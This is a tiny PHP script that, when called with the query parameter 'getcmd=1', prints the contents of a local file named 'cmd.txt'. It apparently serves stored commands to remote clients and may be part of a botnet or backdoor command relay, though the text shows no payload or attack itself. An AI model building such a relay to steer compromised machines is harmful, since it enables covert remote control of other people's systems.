<?php
	Error_Reporting(E_ALL & ~E_NOTICE);
$gcmd			=		$_GET['getcmd']; 
 if ($gcmd == 1)
 {
   $cmd = "cmd.txt";
   echo file_get_contents($cmd);
   
 }
 ?>